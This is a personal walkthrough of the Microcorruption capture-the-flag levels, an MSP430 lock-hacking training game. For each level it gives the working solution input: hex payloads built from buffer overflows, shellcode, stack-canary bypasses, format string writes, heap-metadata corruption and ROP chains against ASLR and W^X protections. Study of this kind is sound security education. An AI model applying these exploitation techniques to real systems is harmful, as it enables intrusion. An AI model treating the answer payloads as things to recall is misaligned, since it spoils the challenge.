# Microcorruption 

## Tutorial

Commands: `help`, `c`, `reset`, `break main`, `s`, `step 5a`, `out` -- to step out of the current function, `f`, `unbreak`, `let pc=4498`, `solve`

`sr` status register, mouse-over to check which flags are set. 

Solve: `password`

## New Orleans

In `check_password`, we see the following comparison: `cmp.b @r13, 0x2400(r14)`. 
In the first iteration of this comparison, `r14` is set to 0.
We find `0x2400` in memory and find a string `!hdg41{`. We guess that this the password stored in plaintext in memory. 

Solve: `!hdg41{`

## Sydney
From manual: password removed from memory

There is a series of comparison statements: 
`cmp #0x406b, 0x0(r15)`, `cmp #0x4b71, 0x2(r15)`, ...

We can gather all of these values and get the hex-encoded form of the password. 

Solve: `(0x)6b40714b722b7a6f`

## Hanoi
From manual: "HSM will return if the password is correct by setting a flag in memory. 

Probably will have to modify memory. 

Seems like there's a check to ensure that the password is at least 8 characters long (else it ends up not being reflected in memory).
There's a check `cmp.b #0xec, &0x2410` in the memory immediately after where the password is stored. 
We can overwrite it by writing the 16 characters of legal password and an additional "0xec" to trick the program. 

Solve: `(0x)61616161616161616161616161616161ec`

## Cusco 
From manual: "We have improved the security of the lock by removing a conditional flag that could accidentally get set by passwords that were too long." 

Observe from the live memory dump that the password is stored on the stack.
We can overwrite the return address in `login` to `unlock_door`i (0x4446). 
the instructions aren't in the disassembly section they can be found in the current instructions section. 

Solve: `(0x)616161616161616161616161616161614644`

## Reykjavik
From manual: "military-grade on-device encryption" seems to be a red flag. 

The `enc` function is quite long, so we skip past it in hopes that we don't have to understand what it does. 
For some reason, in `main`, we see that there is a call to an unlabelled function `call #2400`. 
While stepping through, we note that (for some reason) the instructions are not being reflected in the 'disassembly' section, but we can see the decoded form of the instructions in  the 'Current Instruction' box. 

Through this, we observe that after keying in our password, the instructions proceed to commpare our input with the following values: 
`0x7b46`

And for some reason, this is all that's required. 

Solve: `(0x)467b`
(Admission of guilt: I remember trying to solve this challenge a few (3?) years ago and failing, pretty sure I googled for a hint (the answer), and found a write-up describing this.) 

## Whitehorse
Looks like another instance of buffer overflow. We are able to overwrite the return address, however, it looks like we don't have a clear address that we can jump to to unlock the door. 
From the previous challenge, we learn that we can store instructions in memory, maybe we can try doing that with the memory that we control.

From the user guide, we know that we should send 0x7f to trigger an unlock. We can try that. 
We need to assemble the following instructions: 

```
push #0x7f
call #0x4532
```

We obtain the following: `30127f00b0123245` which is 8 bytes long.
We pad with another `6161616161616161`, and we set the return address to point to the location of the instructions above. 

Solve: `(0x)30127f00b01232454141414141414141b83e`

## Montevideo
We see that the password's stored on the stack again - that's not good...Maybe we can overwrite the return address then? 
Yes, we can. Can we use the previous exploit? 

No we can't, it immediately stops reading after it encounters a null byte. Seems like we need to find another way to express `push #0x7f` in a different way. 

Oh, it appears that just appending a `0x7f` after the return address to jump to works because it makes it appear as though `0x7f` has been pushed onto the stack. 

Solve: `(0x)b0124c45414141414141414161616161ee437f`

## Johannesburg
Rejects passwords which are too long. 😱 How will we buffer overflow then?!

Looks like there's a `cmp.b #0x70, 0x11(sp)` that we can take advantage of. Some flag in stack apparently, which is not that great - we might be able to control this value. 
Think this is a stack canary. Yup, looks like we can bypass this by just adding `0x7070` to our previous payload. 

Solve: `(0x)b01294454141414141414141616161617070ec437f`

## Santa Cruz
From manual: "We have added further mechanisms to verify that passwords which are too long will be rejected." 

Authentication now requires both a username and a password. 
Ugh, okay so there's an `unlock_door` function now, which is nice. But there seem to be quite a few checks in the `login` function to ensure that there's no overflow :\[

Seems like there a total of three checks. We use dynamic analysis to guess the checks:
- Looks like there are two stack canaries this time: 08 10 
- There is a third check `tst.b -0x6(r4); jz <undesirable_location>`, where r4 points to the return address.

We can bypass the third check by overflowing on username, but introducing a reasonable password. 

The first two checks require some understanding of the carry flag and the `cmp` operations, but we get through them via bruteforce (tried values `1010` before `ffff`, which doesn't work). 
Also, strangely, seems like because of those two checks an input that should be considered valid (`usernameusername`, `passwordpassword`) doesn't pass. Strange. 

Solve: 
* `username`: `(0x)414141414141414141414141414141410808ffff414141414141414141414141414141416161626263634a44`
* `password`: `passwordpasswordp`

## Jakarta
From manual: "A firmware update further rejects passwords which are too long." 

The username and password together may be no more than 32 characters. 

`cmp.b #0x21, r11`. We can guess that we can bypass this check with an integer overflow vulnerability. 

Seems like the check for just username alone seems pretty sound; there doesn't seem to be a way to exploit the overflow with just username alone. 
Maybe some flaw when considering length of username + password? The addition could overflow.

Yes! That works. Some weird behaviour when username is 32 characters + the program is executing the following instructions: 
```
sub r11, r14      <-- this causes overflow r14=ffff
and #0x1ff, r14   <-- r14=1ff, which is too much 
```

Solve:
`username`: `usernameusernameusernameusername`
`password`: `(0x)424242424c44414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141`

## Addis Ababa
From manual: "We have verified passwords can not be too long", and a new line "Usernames are printed back to the user for verification"

Oh nice, we're back to `break main`. 

Based on experience, we can guess that because of the use of `printf`s, this is a format string vulnerability. 
This is kind of supported by the fact that `push r11` is immediately followed by `printf`, meaning that that's the only parameter being passed into `printf` and we fully control it. 

And yes! We do see that when we supply `%x.%x.%x.%x` as input, we get ` .7825.252e.2e78` as it pops random values off the stack. 

Cool, this is definitely something I didn't successfully solve a few years ago, so at least I'm starting to learn something new. 
Reference: [link](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)

When we try `AA%x.%n`, we get `load address unaligned: 4141`. Awesome.
When we try with the following payload: `602625782e256e`, we overwrite the value at memory address `3026` with `0x3`, and when the `2e` was removed, `0x2`. 

Finally, we get to exploit the `tst 0x0(sp)` (set when the function returns from `test_password_valid`), and change it to something that's non-zero. 

Solve: `603625782e256e`

## Novosibirsk
From manual: "We have added features from b.03 to the new hardware", and, "...passwords can not be too long". 

Only requires a username to authenticate now. 
Similar to above, user input is directly pushed to `printf`, so we suspect format string vulnerability. 

Ok! Looks like that is indeed the case. (tested with %x). However, we can't use the same fix as above (now `tst r15`). 
So we have to find a different way.

No handy function, but instead of a `ret` there is an `add #0x1f6, sp` in its place which is kind of strange. 
If we can calculate the offset of a useful call (i.e. to `0x4536 <INT>`), we can maybe try to jump to that call with a `0x7f`. 

Ooh, ok no apparently that's not possible because the program is allowed to run until it reaches `__stop_progExec__`. 
HOWEVER, we do discover that we can overwrite addresses with instructions in them! This means potentially changing `0x7e` to `0x7f` in `conditional_unlock_door`. 

We try `AABBDD%x%x%n`, `AABBCCDD%x%x%x%n`... and so on to realize that each addition will result in an increment of 8. Adding a `.` increments by 1. 
0x7f = 127 = 15 * 8 + 7 

Well for whatever reason 15 doesn't work, but because we can just test it and be lazy we find that 20 gets us extremely close (`7a`), and if we add 5 `.`s we get `7f`!

Yay, this works. :D

Solve: `(0x)41414141414141414141414141414141414141414141414141414141414141414141414141414141c84425782e25782e25782e25782e25782e257825782578257825782578257825782578257825782578257825782578256e`

## Algiers
Hm! The manual this time introduces a lot of new information - "This lock contains the all-new LockIT Pro Account Manager".
Account manager contains a mapping of users to PINs, each is 4 digits (a little short). 

Account Manager Authorizer to authorize users. 

AH, we see `malloc` and `free`. Maybe some heap stuff.....

Some weird stuff happening after `ret` in `test_password_valid`. Those could be useful if we need to jump to any of those locations. 
Also, first time noticing that the `INT` is for `0x7D` rather than the `HSM-2` `0x7E`, which has been the case for most of the preceding challenges. 

"Solves the problem of sharing passwords when multiple users must have access to a lock." -- maybe some exploit that involves being able to read from illegal memory? 
But that doesn't really make sense since we can see the memory dump. 

Doesn't seem like there's a mechanism to block usernames that are too long, we try with `usernameusernameAA`, and (for some reason) `usernameusernameAA` again (weirdly, we are prompted for username twice), and we get `load address unaligned: 4145`. 
In trying to figure out why there are two prompts for username, we discover that the sequence of weird instructions that we saw (and briefly mentioned above) corresponds to the locations in memory from where `puts` gets its input. 

So those correspond to string? Not sure why they're obfuscated, though. 

If username takes in an input string that's too long, we get the `load address unaligned` error. 
Based on our past experience, by observing the memory dump of the malloc-d address and the values in this area, we note that when we overflow we overwrite some (meta)data in the heap. 
But what is this (meta)data? 
Reference: [link](http://phrack.org/issues/57/9.html)

Seems like there are three pieces of metadata? 
```
[piece1] [piece2] [piece3]
[???] [???] [???]

pattern recognition 
2400 : [0824] [0010] [0000] [0000] 
2408*: [0824] [1e24] [2100] [x] [x] [x] ... 8 times 
241e*: [0024] [3424] [2100] [x] [x] [x] ... 8 times 
2434 : [1e24] [0824] [9c1f] [00.....00000] 

piece 1 previous pointer maybe?
piece 2 next pointer?
piece 3 could be size 

when the * chunks are free-d, the first two pieces are set to [0824] which could be equivalent to some starting memory location (first free location?) or "null" location
```

From here we can guess that the reason that overflowing the first input causes error is because it overwrites the meta-data of the next malloc-d space. 

We note that the chunk that was malloc-d second was free-d first. From the article, seems like we can overwrite some stuff that will cause a jump to some arbitrary address in memory. 
Still, not quite sure why anything on the heap will be executed when it's freed?

Another resource: [better explanation of heap exploit](http://phrack.org/issues/57/8.html)

Basically, in the process of free-ing, because the previous and the next pointers will be read and overwritten by free, the memory at that address can be updated to point to some shellcode? 

We test it with `4141414141414141414141414141414140244242`, and yes, seems like the address at `2440` is being overwritten! But with the value `0xc`, which doesn't seem like something we can control. 

```markdown
[a] [b]
- copies stuff from b into memory at address a+2
- but also some other stuff, not quite sure what that's about
```

`sp` at `0x4390`. `unlock_door` at `0x4564`. 
Ah...can't jump directly to `unlock_door` because memory there also gets overwritten and corrupts the instruction. What if we jump to 2 bytes before? 
We can try to overwrite the instruction there with something reasonable (`nop` equivalent) so that in the subsequent call to `free` instead of returning we continue to `unlock_door`! 

But how to control the bytes being written? ><

Through the sheer power of bruteforce and refusing to use my brain, this worked.
Notes just in case I want to revisit this to understand it properly: 
`free` is immediately followed by `unlock_door`. But overwriting `ret` so that the `free` function doesn't return, we leverage on the second call to continue execution into `unlock_door`. 
By the sheer power of luck and about 2 hours of mindless swapping of values, we somehow managed to 1) overwrite `ret` 2) into something that's still acceptable as an instruction 3) such that in the second `free` call `unlock_door` is executed. 

Apparently the instruction is `jz $+0x82  <-- (4024)` and I guess the zero flag wasn't set. :)
NOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo I typed out some stuff and accidentally didn't save it. 
Oh well. 

Solve:
* Username >> `(0x)41414141414141414141414141414141402462450400`
* Username >> `(0x)61` <-- don't think it matters what goes here

## Vladivostok
From manual: "...hardware randomization to improve lock security"

No more heap stuff it seems. :) But from the symbols we note that we probably have to deal with `ASLR`. 
From the Wikipedia entry on ASLR, we can consider bruteforce, or leaking addresses with format string vulnerabilities. 

And yes, we see that this is possible, since `%x.%x.%x` gives us `0000.df8a.0000`. 
Limitations are imposed on the number of bytes we can read off of the stack (we can only have a username of 8 characters, which is `%x * 4`). 

We try a couple of values to see if we can guess the position of the stack from the leaked address. 
- (in the format leaked - actual) 
- 7342 - 6590 = 
- aee4 - 9ed0 = 

The above doesn't yield meaningful differences, which means that we can't use the leaked address to jump back to some payload in the stack. However, we notice that the instructions at those leaked addresses are always: 

```asm
0b12           push r11
0a12           push r10
0912           push r9
0812           push r8
```

Maybe we can find the offset of some useful function from there. Seems like that series of instructions belong to `printf`. 

Following the general format of ASLR challenges, perhaps we can find. Uh. Well we don't have to call `system()...` (and we might not even be able to). But maybe we can jump to `printf` to try to perform further address leaks? 

Or use it to find the offset to some of the other helpful functions. 

This is like a combination of format string vulnerability and buffer overflow. 

AFTER A SERIES OF TERRIBLE DECISIONS, FINALLY MANAGED TO GET IT. I was so caught up with trying to think about how it might be possible to to do some code injection that I didn't even think about the obvious solution (just set the correct values in the correct registers with some handy artifacts ("rop gadgets") and rop my way into the solution). Anyway, managed to get it in the end with the following: 

```
| <buffer>
|--------------
| 4900         <-- overflow to replace <ret_addr>
|--------------
| 7f00         <-- unlock!
|--------------
| 4988 (+542)  <-- <ret> to interrupt
|--------------
```

:D

Solve: 
* Username: `%x%x`
* Password: Use `python3 vladivostok.py <found_addr>` to generate

## Bangalore
From manual: "...memory protection", "Each of the 256 pages can either be executable or writeable, but never both" 

Initial thoughts: hmm, maybe there are some places we can jump to to get what we want (we learn our lesson from the previous challenge). 
However, the disassembly is relatively short this time, so we probably have to find some other way. 

Since the functions for the `mark_page_executable` are exposed, maybe there's some way to manipulate it to mark the stack as executable...? 🤔 

One of the pages between 1 to 0x44 is the one with our shellcode that we want to make executable...But what is the size of a page? Aha, we don't have to care - we can make use of this loop

```asm
44f6:  0f4b           mov r11, r15
44f8:  b012 b444      call  #0x44b4 <mark_page_executable>
44fc:  1b53           inc r11
44fe:  3b90 0001      cmp #0x100, r11
4502:  f923           jnz $-0xc <set_up_protection+0x18>
``` 
and this rop gadget
```
4498:  3b41           pop r11
449a:  3041           ret
```

to get what we want.

We set `r11 = 1`, allow it to be marked executable, and voila we should be able to `ret` to our shellcode. 

```asm
mov #0x7f00, sr
call  #0x10
```
this converts to `3240007fb0121000`. 

So here's the plan
```
| <shellcode>
|--------------------
| 4141 * 4
|-------------------
| 4498 <pop_r11>
|------------------
| 0x1 <r11=1>
|------------------
| 44f6 <mark_executable>
|--------------------
| 3fee <pointer_to_stack>
|--------------------
```
payload: `3240007fb0121000414141414141414198441000f644ee3f`

Oh!! The reason we're segfaulting is because the stack is already marked as execute-only.
Either that or registers...? Yeah, think we're setting the page that includes registers to execute-only.

Found a way to inject values into `r15`!. 

```
452a:  0f41           mov sp, r15
452c:  b012 6244      call  #0x4462 <getsn>
```
`r15` will continue to hold on to the values in `sp` after this function returns. 
We can control the content in `sp`, as well as the return address of `<getsn>` so that the value of r15 won't be overwritten. 

We can then control the value of `r15`, and set it to the address of the buffer. 

```
Sketch:
=> <shellcode>
=> <ret to instr to set r15 to sp>
=> <value to set in r15>
=> <ret to oh wait no this won't work, because this call automatically will push ret address to the stack ._.>
```

Also it's pretty crazy that I thought I could use a highly variable register like `sp` to set `r15`. 

Here's all the useful stuff we have currently:
```
- <putchar>: r15 := r14
- pop r11
- when returning from <login>, r14 is 0xa, which is writable
```

We probably can't avoid this anymore. Calculating the page sizes and the page # of our buffer: 
2 bytes = 16 bits of addressable mem 
0x100 pages 
0xffff / 0x100 = 256 = 0x100 <-- this is the size of each page 

Memory of our buffer is at. Oh from the size of our page we know that we only care about for 0x--00,  the values at the `-`s. 
It's somewhere around 3f00 to 4000, which we've actually discovered earlier. This is unfortunately pretty far from 0xa. We need to somehow be able to set `r15 = 0x 256 = 0x100` <-- this is the size of each page 

Memory of our buffer is at. Oh from the size of our page we know that we only care about 0x..00 the values at the `.`s. It's somewhere around 3f00 to 4000, which we've actually discovered earlier. This is unfortunately pretty far from 0xa. We need to somehow be able to set `r15 = 0xa`.

Wait, wtf, I could just set `r11 = 0x3f` and those and up can be set as executable? But that would cause writing to stack problems.....OH. NO IT WON'T. SET `r11=0x40`! Inject shellcode AFTER the buffer instead of within. 

```
Sketch: 
- dummy values * 16
- <ret>: pop r11 (4498)
- <value to insert into r11>: (41) <-- more space for sp to do its thing
- <ret>: mark_page_executable loop (44f6)
- <ret>: ret to shellcode (4100)
- dummy values * 256 - above 
```

This version didn't work because we realize the program reads a maximum of 0x30 = 48 bytes. However, we can push the sp back perhaps by constantly returning and reading a new set of bytes. We test this theory by continuously jumping to a return statement and then finally jumping to `<getsn>` in `<login>`.

This doesn't work because `sp` increments after `ret`. HOWEVER, we can make use of this same idea to push `sp` forward and before reading a new set of 0x30 bytes. 

This works! We run `test_ret` for 4 iterations. 
On the 5th iteration, we run `main` for the extra-fancy stuff. 

For some reason, standard changed to set INT value + 0x80 `:shrug:`. 

Solve: `bangalore.py`. 

## Lagos
From manual: "Passwords may only contain alphanumeric characters"

Seems like our carry bit (`jc`) gap is coming back to haunt us. In the (presumably) check to make sure that characters are legal, this is used for some reason (probably to make sure that things are in range?). 

Some ideas include possibly circumventing the checks by just directly invoking `<getsn>` or using some integer overflow or overlooked edge cases to bypass the alphanumeric limitation. 

## Vancouver 
From manual: sample debug payload `8000023041`

By dynamic analysis, seems like it's `<--mem addr--> <-size-> <--instructions-->`





